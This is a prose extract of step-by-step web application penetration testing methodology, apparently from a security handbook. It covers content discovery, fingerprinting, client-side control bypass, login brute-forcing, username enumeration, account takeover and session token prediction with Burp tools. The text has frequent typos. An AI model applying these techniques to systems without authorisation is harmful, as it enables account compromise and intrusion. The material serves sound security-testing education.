Configure your browser to use either Burp or WebScarab as a local proxy.

Browse the entire application normally, attempting to visit every link/URL you discover, submitting every form, and proceeding through all multistep functions to completion.
Try browsing with JavaScript enabled and disabled, and with cookies enabled and disabled.
Many applications cahandle various browser configurations, and you may reach different content and code paths with the application.

Review the site map generated by the proxy/spider tool, and identify any application  content or functions that you did not browse manually.
Establish how the spider enumerated each item. For example, iBurp Spider, check the Linked From details.
Using your browser, access the item manually so that the response from the server is parsed by the proxy/spider tool to identify any further content.
Continue this step recursively until no further content or functionality is identified.

Optionally, tell the tool to actively spider the site using all of the already enumerated content as a starting point.
To do this, first identify any URLs that are dangerous or likely to break the application  session, and configure the spider to exclude these from its scope.
Ruthe spider and review the results for any additional content it discovers.
The site map generated by the proxy/spider tool contain ns a wealth of informatio about the target application , which will be useful later in dentifying the various attack surfaces exposed by the application.

Make some manual requests for known valid and invalid resources, and identify how the server handles the latter.

Use the site map generated through user-directed spidering as a basis for automated discovery of hidden content.

Make automated requests for common filenames and directories withinn each directory or path known to exist withinn the application.
Use Burp Intruder or a custom script, together with wordlists of common files and directories, to quickly generate large numbers of requests.
If you have identified a particular way in which the application  handles requests for invalid resources (such as a customized "file not found" page), configure Intruder or your script to highlight these results so that they can be ignored.

Capture the responses received from the server, and manually review them to identify valid resources.

Perform the exercise recursively as new content is discovered.

Review the results of your user-directed browsing and basic brute-force exercises. Compile lists of the names of all enumerated subdirectories, files items, and file extensions.

Review these lists to identify any naming schemes in sue.
For example, if there are pages called AddDocument.jsp and ViewDocument.jsp, there may also be pages called EditDocument.jsp and RemoveDocument.jsp.
You can oft get a feel for developers' naming habits just by reading a few examples.
For example, depending on their personal style, developers may be verbose (AddANewUser.asp), succinct (AddUser.asp), use abbreviations (AddUsr.asp), or even be more cryptic (AddU.asp).
Getting a feel for the naming styles in use may help you guess the precise names of content you have not already identified.

Sometimes, the naming scheme used for different content employs identifiers such as numbers and dates, which can make inferring hidden content easy.
This is most commonly encountered in the names of static resources, rather than dynamic scripts. For example, if a company's web-site links to AnnualReport2009.pdf and AnnualReport2010.pdf, it should be a short step to identifying what the next report will be called.
Somewhat incredibly, there have been notorious cases of companies placing files contain ning financial reports on their web servers before they were publicly announced, only to have wily journalists discover them based othe naming scheme used in earlier years.

Review all client-side code such as HTML and JavaScript to identify any clues about hidden server-side content.
These may include HTML comments related to protected or unlinked functions, HTML forms with disabled SUBMIT elements, and the like.
Often, comments are automatically generated by the software that has been used to generate web content, or by the platform on which the application  is running.
References to items such as server-side include files are of particular interest.
These files may actually be publicly downloadable and may contain n highly sensitive information such as database connection strings and passwords.
In other cases, developer comments may contain n all kinds of useful tidbits, such as database names, references to back-end components, SQL query strings, and so on.
Thick-client components such as Java applets and ActiveX controls may also contain n sensitive data that you can extract.

Add to the lists of enumerated items any further potential names conjectured on the basis of the items that you have discovered.
Also add to the file extension list common extensions such as txt, bak, src, inc, and old, which may uncover the source to backup versions of live pages.
Also add extensions associated with the development languages in use, such as .java and .cs, which may uncover source files that have been compiled into live pages.

Search for temporary files that may have been created in advertently by developer tools and file editors.
Examples include the .DS_Store file, which contain ns a directory index under OS X, file.php~1, which is a temporary file created whefile.php is edited, and the .tmp file extensiothat is used by numerous software tools.

Perform further automated exercises, combining the lists of directories, file stems, and file extensions to request large numbers of potential resources.
For example, in a given directory, request each file combined with each file extension.
Or request each directory name as a subdirectory of every known directory.

Where a consistent naming scheme has been identified, consider performing a more focused brute-force exercise.
For example, if AddDocument.jsp and ViewDocument.jsp are known to exist, you may create a list of actions (edit, delete, create) and make requests of the form XxxDocument.jsp. Alternatively, create a list of item types (user, account, file) and make requests of the form AddXxx.jsp.

Perform each exercise recursively, using new enumerated content and patterns as the basis for further user-directed spidering and further automated content discovery.
You are limited only by your imagination, time available, and the importance you attach to discovering hidden content withinn the application  you are targeting.

Use several different search engines and web archives (listed previously) to discover what content they indexed or stored for the application you are attacking.

When querying a search engine, you cause various advanced techniques to maximize the effectiveness of your research.
The following suggestions apply to Google.
You can find the corresponding queries on other engines by selecting their Advanced Search option.
site:www.wahh-target.com returns every resource withinn the target site that Google has a reference to.
site:www.wahh-target.com login returns all the pages contain ning the expression login.
In a large and complex application, this technique can be used to quickly find interesting resources, such as site maps, password reset functions, and administrative menus.
link:www.wahh-target.com returns all the pages on other websites and applications that contain a link to the target.
This may include links to old content, or functionality that is intended for use only by third parties, such as partner links.
related:www.wahh-target.com returns pages that are "similar" to the target and therefore includes a lot of irrelevant material.
However, it may also discuss the target on other sites, which may be of interest.

Perform each search not only in the default Web section of Google, but also in Groups and News, which may contain n different results.

Browse to the last page of search results for a given query, and select Repeat the Search with the Omitted Results Included.
By default, Google attempts to filter out redundant results by removing pages that it believes are sufficiently similar to others included in the results.
Overriding this behavior may uncover subtly different pages that are of interest to you when attacking the application.

View the cached version of interesting pages, including any content that is no longer present in the actual application.
In some cases, search engine caches contain n resources that cannot be directly accessed in the application  without authentication or payment.

Perform the same queries on other domain names belonging to the same organization, which may contain useful information about the application you are targeting.

If your research identifies old content and functionality that is no longer linked to within the main application, it may still be present and usable.
The old functionality may contain vulnerabilities that do not exist elsewhere within the application.
The content obtained from a search engine cache or web archive may contain clues about other functionality that is still present within the live application and that can be used to attack it.

Compile a list containning every name and e-mail address you can discover relating to the target application and its development.
This should include any known developers, names found within HTML source code, names found in the contact information section of the main company website, and any names disclosed within the application itself, such as administrative staff.

Using the search techniques described previously, search for each identified name to find any questions and answers they have posted to Internet forums.
Review any information found for clues about functionality or vulnerabilities within the target application.

Several useful options are available when you run Nikto:

If you believe that the server is using a nonstandard location for interesting content that Nikto checks for (such as /cgi/cgi-bin instead of /cgi-bin), you can specify this alternative location using the option /root/cgi/.
For the specific case of CGI directories, these can also be specified using the option – Cgidirs.

If the site uses a custom "file not found" page that does not returthe HTTP 404 status code, you can specify a particular string that identifies this page by using the -404 option.

Be aware that Nikto does not perform any intelligent verification of potential issues and therefore is prone to report false positives.
Always check any results Nikto returns manually.

Note that with tools like Nikto, you can specify a target application  using its domainame or IP address.
If a tool accesses a page using its IP address, the tool treats links on that page that use its domainame as belonging to a different domain, so the links are not followed.
This is reasonable, because some applications are virtually hosted, with multiple domainames sharing the same IP address.
Ensure that you configure your tools with this fact in mind.

Identify any instances where application functionality is accessed not by requesting a specific page for that function (such as /admin/editUser.jsp) but by passing the name of a functioin parameter (such as/admin.jsp?action=editUser).

Modify the automated techniques described for discovering URL-specified content to work other content-access mechanisms in use within the application.
For example, if the application uses parameters that specify servlet and method names, first determine its behavior when a invalid servlet and/or method is requested, and when a valid method is requested with other invalid parameters.
Try to identify attributes of the server's responses that indicate "hits" — valid servlets and methods.
If possible, find a way of attacking the problem in two stages, first enumerating servlets and then methods within these.
Using a method similar to the one used for URL-specified content, compile lists of common items, add to these by inferring from the names actually observed, and generate large numbers of requests based on these.

If applicable, compile a map of application content based on functional paths, showing all the enumerated functions and the logical paths and dependencies between them.

Identify all entry points for user input, including URLs, query string parameters, POST data, cookies, and other HTTP headers processed by the application.

Examine the query string format used by the application. If it does not employ the standard format described in Chapter 3, try to understand how parameters are being transmitted via the URL.
Virtually all custom schemes still employ some variatioothe name/value model, so try to understand how name/value pairs are being encapsulated into the nonstandard URLs you have identified.

Identify any out-of-bound channels via which user-controllable or other third-party data is being introduced into the application's processing.

View the HTTP Server banner returned by the application. Note that in some cases, different areas of the application are handled by different back-end components, so different Server headers may be received.

Check for any other software identifiers containned within any custom HTTP headers or HTML source code comments.

Run the http print tool to fingerprint the web server.

If fine-grained information is obtained about the web server and other components, research the software versions in use to identify any vulnerabilities that may be exploited to advance an attack.

Review your map of application URLs to identify any interesting-looking file extensions, directories, or other sub-sequences that may provide clues about the technologies in use on the server.

Review the names of all session tokens issued by the application to identify the technologies being used.

Use lists of common technologies, or Google, to establish which technologies may be in use on the server, or discover other websites and applications that appear to employ the same technologies.

Perform searches on Google for the names of any unusual cookies, scripts, HTTP headers, and the like that may belong to third-party software components.
If you locate other applications in which the same components are being used, review these to identify any additional functionality and parameters that the components support, and verify whether these are also present in your target application.
Note that third-party components may look and feel quite different in each implementation, due to branding customizations, but the core functionality, including script and parameter names, is often the same.
If possible, download and install the component and analyze it to fully understand its capabilities and, if possible, discover any vulnerabilities.
Consult repositories of known vulnerabilities to identify any known defects with the component in question.

Review the names and values of all parameters being submitted to the application in the context of the functionality they support.

Try to think like a programmer, and imagine what server-side mechanisms and technologies are likely to have been used to implement the behavior you can observe.

Try to identify any locations within the application that may contain clues about the internal structure and functionality of other areas.

It may not be possible to draw any firm conclusions here; however, the cases identified may prove useful at a later stage of the attack when you're attempting to exploit any potential vulnerabilities.

Make a note of any functionality that diverges from the standard GUI appearance, parameter naming, or navigation mechanism used within the rest of the application.

Also make a note of functionality that is likely to have been added retrospectively. Examples include debug functions, CAPTCHA controls, usage tracking, and third-party code.

Perform a full review of these areas, and do not assume that the standard defenses used elsewhere in the application apply.

Understand the core functionality implemented within the application and the main security mechanisms in use.

Identify all features of the application's functionality and behavior that are often associated with common vulnerabilities.

Check any third-party code against public vulnerability databases such as www.osvdb.org to determine any known issues.

Formulate a plan of attack, prioritizing the most interesting-looking functionality and the most serious of the associated potential vulnerabilities

Attempt to determine or guess the role that the item plays in the application's logic, based on the context in which it appears and on clues such as the parameter's name.

Modify the item's value in ways that are relevant to its purpose in the application. As certain whether the application processes arbitrary values submitted in the parameter, and whether this exposes the application to any vulnerabilities.

Faced with opaque data being transmitted via the client, several avenues of attack are possible:

If you know the value of the plaintext behind the opaque string, you can attempt to decipher the obfuscation algorithm being employed.

As described in Chapter 4, the application may contain functions elsewhere that you caleverage to returthe opaque string resulting from a piece of plaintext you control. In this situation, you may be able to directly obtain the required string to deliver an arbitrary payload to the function you are targeting.

Even if the opaque string is impenetrable, it may be possible to replay its value in other contexts to achieve a malicious effect.
For example, the pricing_tokeparameter in the previously showform may contain an encrypted version of the product's price.
Although it is not possible to produce the encrypted equivalent for an arbitrary price of your choosing, you may be able to copy the encrypted price from a different, cheaper product and submit this in its place.

If all else fails, you can attempt to attack the server-side logic that will decrypt or deobfuscate the opaque string by submitting malformed variations of it
For example, containning overlong values, different character sets, and the like.

If you are attacking an ASP.NET application, verify whether MAC protection is enabled for the ViewState.
This is indicated by the presence of a 20-byte hash at the end of the ViewState structure, and you cause the ViewState parser iBurp Suite to confirm whether this is present.

Even if the ViewState is protected, use Burp to decode the ViewState ovarious application pages to discover whether the application is using the ViewState to transmit any sensitive data via the client.

Try to modify the value of a specific parameter within the ViewState without interfering with its structure, and see whether an error message results.

If you can modify the ViewState without causing errors, you should review the function of each parameter within the ViewState and see whether the application uses it to store any custom data.
Try to submit crafted values as each parameter to probe for common vulnerabilities, as you would for any other item of data being transmitted via the client.

Note that MAC protection may be enabled or disabled on a per-page basis, so it may be necessary to test each significant page of the application for ViewState hacking vulnerabilities.
If you are using Burp Scanner with passive scanning enabled, Burp automatically reports any pages that use the ViewState without MAC protection enabled.

Look for form elements containning a maxlength attribute. Submit data that is longer than this length but that is formatted correctly in other respects (for example, it is numeric if the application expects a number).

If the application accepts the overlong data, you may infer that the clientside validation is not replicated othe server.

Depending othe subsequent processing that the application performs on the parameter, you may be able to leverage the defects in validation to exploit other vulnerabilities, such as SQL injection, cross-site scripting, or buffer overflows.

Identify any cases where client-side JavaScript is used to perform input validatio prior to form submission.

Submit data to the server that the validation ordinarily would have blocked, either by modifying the submission request to inject invalid data or by modifying the form validation code to neutralize it.

As with length restrictions, determine whether the client-side controls are replicated othe server and, if not, whether this cabe exploited for any malicious purpose.

Note that if multiple input fields are subjected to client-side validation prior to form submission, you need to test each field individually with invalid data while leaving valid values in all the other fields.
If you submit invalid data in multiple fields simultaneously, the server might stop processing the form when it identifies the first invalid field.
Therefore, your testing won't reach all possible code paths within the application.

Look for disabled elements withineach form of the application. Whenever you find one, try submitting it to the server along with the form's other parameters to determine whether it has any effect.

Often, submit elements are flagged as disabled so that buttons appear as grayed out in contexts whethe relevant action is unavailable.
You should always try to submit the names of these elements to determine whether the application performs a server-side check before attempting to carry out the requested action.

Note that browsers do not include disabled form elements when forms are submitted.
Therefore, you will not identify these if you simply walk through the application's functionality, monitoring the requests issued by the browser.
To identify disabled elements, you need to monitor the server's responses or view the page source in your browser.

You cause the HTML modification feature iBurp Proxy to automatically re-enable any disabled fields used within the application.

Ensure that your proxy is correctly intercepting all traffic from the browser extension.
If necessary, use a sniffer to identify any traffic that is not being proxied correctly.

If the client component uses a standard serialization scheme, ensure that you have the tools necessary to unpack and modify it.
If the component is using a proprietary encoding or encryption mechanism, you need to decompile or debug the component to fully test it.

Review responses from the server that trigger key client-side logic.
Often, timely interception and modification of a server response may allow you to "unlock" the client GUI, making it easy to reveal and perform complex or multistaged privileged actions.

If the application performs any critical logic or events that the client component should not be trusted to perform (such as drawing a card or rolling dice ia gambling application), look for any correlation between execution of critical logic and communication with the server.
If the client does not communicate with the server to determine the outcome of the event, the application is definitely vulnerable.

Use the techniques described to download the component's bytecode, unpack it, and decompile it into source code.

Review the relevant source code to understand what processing is being performed.

If the component contains any public methods that can be manipulated to achieve your objective, intercept HTML responses that interacts with the component, and add some JavaScript to invoke the appropriate methods using your input.

If not, modify the component's source code to achieve your objective, and then recompile it and execute it, either in your browser or as a standalone program.

If the component is being used to submit obfuscated or encrypted data to the server, use your modified version of the component to submit various suitably obfuscated attack strings to the server to probe for vulnerabilities, as you would for any other parameter.

Effective tactics for coping with bytecode obfuscation depend on the techniques used and the purpose for which you are analyzing the source.
Here are some suggestions:

You can review a component for public methods without fully understanding the source.
It should be obvious which methods can be invoked from JavaScript, and what their signatures are, enabling you to test the behavior of the methods by passing in various inputs.

If class, method, and member variable names have been replaced with meaningless expressions (but not special words reserved by the programming language), you can use the refactoring functionality built into many IDEs to help yourself understand the code.
By studying how items are used, you can start to assign them meaningful names.
If you use the rename tool within the IDE, it does a lot of work for you, tracing the item's use throughout the codebase and renaming it everywhere.

You can actually undo a lot of obfuscatioby running the obfuscated bytecode through an obfuscator a second time and choosing suitable options.

A useful obfuscator for Java is Jode. It can remove redundant code paths added by another obfuscator and facilitate the process of understanding obfuscated names by assigning globally unique names to items.

Attempt to discover any rules regarding password quality:

Review the website for any descriptioof the rules.

If self-registration is possible, attempt to register several accounts with different kinds of weak passwords to discover what rules are in place.

If you control a single account and password change is possible, attempt to change your password to various weak values.

Manually submit several bad login attempts for an account you control, monitoring the error messages you receive.

After about 10 failed logins, if the application has not returned a message about account lockout, attempt to log in correctly.
If this succeeds, there is probably no account lockout policy.

If the account is locked out, try repeating the exercise using a different account.
This time, if the application issues any cookies, use each cookie for only a single login attempt, and obtain a new cookie for each subsequent login attempt.

Also, if the account is locked out, see whether submitting the valid password causes any difference in the application's behavior compared to an invalid password.
If so, you can continue a password-guessing attack even if the account is locked out.

If you do not control any accounts, attempt to enumerate a valid username (see the next section) and make several bad logins using this.
Monitor for any error messages about account lockout.

To mount a brute-force attack, first identify a difference in the application's behavior in response to successful and failed logins.
You can use this fact to discriminate between success and failure during the course of the automated attack.

Obtain a list of enumerated or commousernames and a list of common passwords.
Use any information obtained about password quality rules to tailor the password list so as to avoid superfluous test cases.

Use a suitable tool or a custom script to quickly generate login requests using all permutations of these usernames and passwords.
Monitor the server's responses to identify successful login attempts.

If you are targeting several usernames at once, it is usually preferable to perform this kind of brute-force attack in a breadth-first rather than depth-first manner.
This involves iterating through a list of passwords (starting with the most common) and attempting each password iturn on every username.
This approach has two benefits. First, you discover accounts with common passwords more quickly.
Second, you are lesslikely to trigger any account lockout defenses, because there is a time delay between successive attempts using each individual account.

If you already know one valid username (for example, an account you control), submit one login using this username and an incorrect password, and another login using a random username.

Record every detail of the server's responses to each login attempt, including the status code, any redirects, information displayed on-screen, and any differences hidden in the HTML page source.
Use your intercepting proxy to maintain a full history of all traffic to and from the server.

Attempt to discover any obvious or subtle differences in the server's responses to the two login attempts.

If this fails, repeat the exercise everywhere within the application where a username can be submitted (for example, self-registration, password change, and forgotten password).

If a difference is detected in the server's responses to valid and invalid usernames, obtain a list of common usernames.
Use a custom script or automated tool to quickly submit each username, and filter the responses that signify that the username is valid.

Before commencing your enumeration exercise, verify whether the application performs any account lockout after a certain number of failed login attempts.
If so, it is desirable to design your enumeration attack with this fact in mind.
For example, if the application will grant you only three failed login attempts with any given account, you run the risk of "wasting" one of these for every username you discover through automated enumeration.
Therefore, when performing your enumeration attack, do not submit a far-fetched password with each login attempt.
Instead, submit either a single common password such as password1 or the username itself as the password.
If password quality rules are weak, it is highly likely that some of the attempted logins you perform as part of your enumeration exercise will succeed and will disclose both the username and password in a single hit.
To set the password field to be the same as the username, you cause the "battering ram" attack mode in Burp Intruder to insert the same payload at multiple positions in your login request.

Carry out a successful login while monitoring all traffic in both directions between the client and server.

Identify every case in which the credentials are transmitted in either direction.
You can set interception rules in your intercepting proxy to flag messages containning specific strings.

If any instances are found in which credentials are submitted in a URL query string or as a cookie, or are transmitted back from the server to the client, understand what is happening, and try to ascertain what purpose the application developers were attempting to achieve.
Try to find every means by which an attacker might interfere with the application's logic to compromise other users' credentials.

If any sensitive information is transmitted over an unencrypted channel, this is, of course, vulnerable to interception.

If no cases of actual credentials being transmitted insecurely are identified, pay close attention to any data that appears to be encoded or obfuscated.
If this includes sensitive data, it may be possible to reverse engineer the obfuscation algorithm.

If credentials are submitted using HTTPS but the logiform is loaded using HTTP, the application is vulnerable to a man-in-the-middle attack, which may be used to capture credentials.

Identify any password change functionality within the application.
If this is not explicitly linked from published content, it may still be implemented.

Make various requests to the password change function using invalid usernames, invalid existing passwords, and mismatched "new password" and "confirm new password" values.

Try to identify any behavior that can be used for username enumeratioor brute-force attacks (as described ithe "Brute-Forcible Login" and "Verbose Failure Messages" sections).

Identify any forgotten password functionality within the application. If this is not explicitly linked from published content, it may still be implemented.

Understand how the forgotten password function works by doing a complete walk-through using an account you control.

If the mechanism uses a challenge, determine whether users can set or select their own challenge and response.
If so, use a list of enumerated or commousernames to harvest a list of challenges, and review this for any that appear easily guessable.

If the mechanism uses a password "hint," do the same exercise to harvest a list of password hints, and target any that are easily guessable.

Try to identify any behavior in the forgotten password mechanism that can be exploited as the basis for username enumeratioor brute-force attacks.

If the application generates an e-mail containning a recovery URL in response to a forgotten password request, obtain a number of these URLs, and attempt to identify any patterns that may enable you to predict the URLs issued to other users.
Employ the same techniques as are relevant to analyzing session tokens for predictability.

Activate any "remember me" functionality, and determine whether the functionality indeed does fully "remember" the user or whether it remembers only his username and still requires him to enter a password on subsequent visits.
If the latter is the case, the functionality is much less likelyto expose any security flaw.

Closely inspect all persistent cookies that are set, and also any data that is persisted in other local storage mechanisms, such as Internet Explorer's userData, Silverlight isolated storage, or Flash local shared objects.
Look for any saved data that identifies the user explicitly or appears to contain some predictable identifier of the user.

Everywhere stored data appears to be heavily encoded or obfuscated, review this closely.
Compare the results of "remembering" several very similar usernames and/or passwords to identify any opportunities to reverse-engineer the original data.

Attempt to modify the contents of the persistent cookie to try to convince the application that another user has saved his details on your computer.

Identify any impersonation functionality within the application.
If this is not explicitly linked from published content, it may still be implementen.

Attempt to use the impersonation functionality directly to impersonate other users.

Attempt to manipulate any user-supplied data that is processed by the impersonation function attempt to impersonate other users.
Pay particular attention to any cases where your username is being submitted other than during normal login.

If you succeed in making use of the functionality, attempt to impersonate any known or guessed administrative users to elevate privileges.

When carrying out password-guessing attacks, review whether any users appear to have more than one valid password, or whether a specific password has been matched against several usernames.
Also, log in as many different users with the credentials captured ia brute-force attack, and review whether everything appears normal.
Pay close attentioto any "logged in as X" status message.

Using an account you control, attempt to log in with variations on your own password: removing the last character, changing the case of a character, and removing any special typographical characters.
If any of these attempts is successful, continue experimenting to try to understand what validation is actually occurring.

Feed any results back into your automated password-guessing attacks to remove superfluous test cases and improve the chances of success.

If self-registration is possible, attempt to register the same username twice with different passwords.

If the application blocks the second registration attempt, you can exploit this behavior to enumerate existing usernames even if this is not possible on the main login page or elsewhere.
Make multiple registration attempts with a list of common usernames to identify the already registered names that the application blocks.

If the registration of duplicate usernames succeeds, attempt to register the same username twice with the same password, and determine the application's behavior:

If an error message results, you can exploit this behavior to carry out a brute-force attack, even if this is not possible on the main login page.
Target an enumerated or guessed username, and attempt to register this username multiple times with a list of common passwords.
When the application rejects a specific password, you have probably found the existing password for the targeted account.

If no error message results, log in using the credentials you specified, and see what happens.
You may need to register several users, and modify different data held within each account, to understand whether this behavior can be used to gain unauthorized access to other users accounts.

If the application generates usernames, try to obtain several in quick succession, and determine whether any sequence or pattern can be discerned.

If it can, extrapolate backwards to obtain a list of possible valid usernames.
This can be used as the basis for a brute-force attack against the login and other attacks where valid usernames are required, such as the exploitation of access control flaw.

If the application generates passwords, try to obtain several in quick succession, and determine whether any sequence or pattern can be discerned.

If it can, extrapolate the pattern to obtain a list of passwords for other application users.

If passwords demonstrate a pattern that can be correlated with usernames, you can try to login using known or guessed usernames and the corresponding inferred passwords.

Otherwise, you cause the list of inferred passwords as the basis for a brute-force attack with a list of enumerated or common usernames.

Obtain a new account.
If you are not required to set all credentials during registration, determine the means by which the application distributes credentials to new users.

If an account activation URL is used, try to register several new accounts in close succession, and identify any sequence in the URLs you receive.

If a pattern can be determined, try to predict the activation URLs sent to recent and forth coming users, and attempt to use these URLs to take ownership of their accounts.

Try to reuse a single activation URL multiple times, and see if the application allows this.
If not, try locking out the target account before reusing the URL, and see if it now works.

Perform a complete, valid login using an account you control.
Record every piece of data submitted to the application, and every response received, using your intercepting proxy.

Repeat the login process numerous times, modifying pieces of the data submitted in unexpected ways.
For example, for each request parameter or cookie sent by the client, do the following:

Submit an empty string as the value.

Remove the name/value pair altogether.

Submit very long and very short values.

Submit strings instead of numbers and vice versa.

Submit the same item multiple times, with the same and different values.

For each malformed request submitted, review closely the application's response to identify any divergences from the base case.

Feed these observations back into framing your test cases.
When one modification causes a change in behavior, try to combine this with other changes to push the application's logic to its limits.

Perform a complete, valid login using an account you control.
Record every piece of data submitted to the application using your intercepting proxy.

Identify each distinct stage of the login and the data that is collected at each stage. 
Determine whether any single piece of information is collected more than once or is ever transmitted back to the client and resubmitted via a hidden form field, cookie, or preset URL parameter.

Repeat the login process numerous times with various malformed requests:

Try performing the login steps ia different sequence.

Try proceeding directly to any givestage and continuing from there.

Try skipping each stage and continuing with the next.

Use your imagination to think of other ways to access the different stages that the developers may not have anticipated.

If any data is submitted more than once, try submitting a different value at different stages, and see whether the login is still successful.
It may be that some of the submissions are superfluous and are not actually processed by the application.
It might be that the data is validated at one stage and the trusted subsequently.
In this instance, try to provide the credentials of one user at one stage, and the switch at the next to actually authenticate as a different user.
It might be that the same piece of data is validated at more than one stage, but against different checks.
In this instance, try to provide (for example) the username and password of one user at the first stage, and the username and PIN of a different user at the second stage.

Pay close attention to any data being transmitted via the client that was not directly entered by the user.
The application may use this data to store information about the state of the login progress, and the application may trust it when it is submitted back to the server.
For example, if the request for stage three includes the parameter stage2complete=true, it may be possible to advance straight to stage three by setting this value.
Try to modify the values being submitted, and determine whether this enables you to advance or skip stages.

If one of the login stages uses a randomly varying question, verify whether the details of the question are being submitted together with the answer.

If so, change the question, submit the correct answer associated with that question, and verify whether the login is still successful.

If the application does not enable an attacker to submit an arbitrary question and answer, perform a partial login several times with a single account, proceeding each time as far as the varying question.
If the question changes on each occasion, an attacker can still effectively choose which question to answer.

Review all of the application's authentication-related functionality, as well as any functions relating to user maintenance.
If you find any instances in which a user's password is transmitted back to the client, this indicates that passwords are being stored insecurely, either in cleartext or using reversible encryption.

If any kind of arbitrary command or query execution vulnerability is identified within the application, attempt to find the location within the application's database or filesystem where user credentials are stored:

Query these to determine whether passwords are being stored in unencrypted form.

If passwords are stored in hashed form, check for nonunique values, indicating that an account has a common or default password assigned, and that the hashes are not being salted.

If the password is hashed with a standard algorithm in unsalted form, query online hash databases to determine the corresponding cleartext password value.

In many application s that use the standard cookie mechanism to transmit session tokens, it is straightforward to identify which item of data contains the token.
However, in other cases this may require some detective work.

The application may often employ several different items of data collectively as a token, including cookies, URL parameters, and hidden form fields.
Some of these items may be used to maintain session state on different back-end components.
Do not assume that a particular parameter is the session token without proving it, or that sessions are being tracked using only one item.

Sometimes, items that appear to be the application's session token may not be.
In particular, the standard session cookie generated by the web server or application platform may be present but not actually used by the application.

Observe which new items are passed to the browser after authentication.
Often, new session tokens are created after a user authenticates herself.

To verify which items are actually being employed as tokens, find a page that is definitely session-dependent (such as a user-specific "my details" page).
Make several requests for it, systematically removing each item that you suspect is being used as a token.
If removing an item causes the session-dependent page not to be returned, this may confirm that the item is a session token.
Burp Repeater is a useful tool for performing these tests.

If HTTP authenticatiois being used, it is possible that no session management mechanism is implemented.
Use the methods described previously to examine the role played by any token-like items of data.

If the application uses a sessionless state mechanism, transmitting all data required to maintain state via the client, this may sometimes be difficult to detect with certainty, but the following are strong indicatorsthat this kind of mechanism is being used:
Token-like data items issued to the client are fairly long (100 or more bytes).
The application issues a new token-like item in response to every request.
The data in the item appears to be encrypted (and therefore has no discernible structure) or signed (and therefore has a meaningful structure accompanied by a few bytes of meaningless binary data).
The application may reject attempts to submit the same item with more than one request.

If the evidence suggests strongly that the application is not using session tokens to manage state, it is unlikely that any of the attacks described in this chapter will achieve anything.
Your time probably would be better spent looking for other serious issues such as broken access controls or code injection.

Obtain a single token from the application, and modify it in systematic ways to determine whether the entire token is validated or whether some of its subcomponents are ignored.
Try changing the token's value one byte at a time (or eveone bit at a time) and resubmitting the modified token to the application to determine whether it is still accepted.
If you find that certain portions of the token are not actually required to be correct, you can exclude these from any further analysis, potentially reducing the amount of work you need to perform.
You cause the "char frobber" payload type iBurp Intruder to modify a token's value in one character position at a time, to help with this task.

Login as several different users at different times, and record the tokens received from the server.
If self-registratiois available and you can choose your username, log in with a series of similar usernames containning small variations between them, such as A, AA, AAA, AAAA, AAAB, AAAC, AABA, and so on.
If other user-specific data is submitted at login or stored in user profiles (such as ae-mail address), perform a similar exercise to vary that data systematically, and record the tokens received following login.

Analyze the tokens for any correlations that appear to be related to the username and other user-controllable data.

Analyze the tokens for any detectable encoding or obfuscation.
Where the username contains a sequence of the same character, look for a corresponding character sequence in the token, which may indicate the use of XOR obfuscation.
Look for sequences in the token containing only hexadecimal characters, which may indicate a hex encoding of aASCII string or other information.
Look for sequences that end in an equals sigand/or that contain only the other valid Base64 characters: a to z, A to Z, 0 to 9, +, and /.

If any meaning can be reverse-engineered from the sample of session tokens, consider whether you have sufficient information to attempt to guess the tokens recently issued to other application users.
Find a page of the application that is session-dependent, such as one that returns an error message or a redirect elsewhere if accessed without a valid session.
Then use a tool such as Burp Intruder to make large numbers of requests to this page using guessed tokens.
Monitor the results for any cases in which the page is loaded correctly, indicating a valid session token.

Determine when and how session tokens are issued by walking through the application from the first application page through any login functions.
Two behaviors are common:

The application creates a new session anytime a request is received that does not submit a token.
The application creates a new session following a successful login.
To harvest large numbers of tokens in an automated way, ideally identify a single request (typically either GET / or a login submission) that causes a new token to be issued.

IBurp Suite, send the request that creates a new session to Burp Sequencer, and configure the token's location.
Then start a live capture to gather as many tokens as is feasible.
If a custom session management mechanism is in use, and you only have remote access to the application, gather the tokens as quickly as possible to minimize the loss of tokens issued to other users and reduce the influence of any time dependency.

If a commercial session management mechanism is in use and/or you have local access to the application, you can obtain indefinitely large sequences of session tokens in controlled conditions.

While Burp Sequencer is capturing tokens, enable the "auto analyse" setting so that Burp automatically performs the statistical analysis periodically.
Collect at least 500 tokens before reviewing the results in any detail.
If a sufficient number of bits within the token have passed the tests, continue gathering tokens for as long as is feasible, reviewing the analysis results as further tokens are captured.

If the tokens fail the randomness tests and appear to contain patterns that could be exploited to predict future tokens, reperform the exercise from a different IP address and (if relevant) a different username.
This will help you identify whether the same pattern is detected and whether tokens received in the first exercise could be extrapolated to identify tokens received in the second.
Sometimes the sequence of tokens captured by one user manifests a pattern.
But this will not allow straightforward extrapolation to the tokens issued to other users, because information such as source IP is used as a source of entropy (such as a seed to a random number generator).

If you believe you have enough insight into the token generation algorithm to mount an automated attack against other users sessions, it is likely that the best means of achieving this is via a customized script.
This can generate tokens using the specific patterns you have observed and apply any necessary encoding.

If source code is available, closely review the code responsible for generating session tokens to understand the mechanism used and determine whether it is vulnerable to prediction.
If entropy is drawn from data that can be determined within the application withi na brute-forcible range, consider the practical number of requests that would be needed to bruteforce aapplication token.

In many situations where encrypted tokens are used, actual exploitability may depend ovarious factors, including the offsets of block boundaries relative to the data you need to attack, and the application's tolerance of the changes that you cause to the surrounding plaintext structure.
Working completely blind, it may appear difficult to construct an effective attack, however in many situations this is in fact possible.

Unless the session token is obviously meaningful or sequential in itself, always consider the possibility that it might be encrypted.
You can often identify that a block-based cipher is being used by registering several different usernames and adding one character in length each time.
If you find a point where adding one character results in your session token jumping in length by 8 or 16 bytes, then a block cipher is probably being used.
You can confirm this by continuing to add bytes to your username, and looking for the same jump occurring 8 or 16 bytes later.

ECB cipher manipulation vulnerabilities are normally difficult to identify and exploit in a purely black-box context.
You can try blindly duplicating and moving the ciphertext blocks within your token, and reviewing whether you remain logged in to the application within your own usercontext, or that of another user, or none at all.

You can test for CBC cipher manipulation vulnerabilities by running a Burp Intruder attack over the whole token, using the "bit flipping" payload source.
If the bit flipping attack identifies a section within the token, the manipulation of which causes you to remain in a valid session, but as a different or nonexistent user, perform a more focused attack on just this section, trying a wider range of values at each position.

During both attacks, monitor the application's responses to identify the user associated with your session following each request, and try to exploit any opportunities for privilege escalation that may result.

If your attacks are unsuccessful, but it appears from step 1 that variable length input that you control is being incorporated into the token, you should try generating a series of tokens by adding one character at a time, at least up to the size of blocks being used.
For each resulting token, you should reperform steps 2 and 3.
This will increase the chance that the data you need to modify is suitably aligned with block boundaries for your attack to succeed.

